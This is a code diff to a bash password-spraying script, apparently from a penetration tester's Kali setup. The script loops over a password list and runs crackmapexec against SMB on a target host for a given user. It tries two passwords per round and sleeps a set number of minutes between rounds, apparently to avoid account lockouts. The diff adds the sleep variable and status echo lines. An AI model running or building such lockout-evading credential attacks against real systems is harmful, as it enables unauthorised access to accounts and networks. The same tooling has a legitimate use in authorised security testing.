@@ -22,6 +22,7 @@
 
 #<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+sleep_timer="sleep $4m"
 
 count=$(wc -l < $3)
 
@@ -31,7 +32,7 @@ while [ $count -gt 0 ]; do
 	head -n $count $3 > tmp.txt
 	
 	for pass in $(cat tmp.txt | head -2); do
-		
+		echo "spraying: $pass"
 		crackmapexec smb $1 -u $2 -p $pass --continue-on-success --log /home/kali/Documents/sprays/spraygun.txt
 		echo $pass >> /home/kali/Documents/sprays/used-passwords.txt
 
@@ -45,6 +46,7 @@ while [ $count -gt 0 ]; do
 	sed -i "1,2d" $3
 	
 	count=$(wc -l < $3)
+	echo "sleeping for $4"
 	$sleep_timer
 done
 
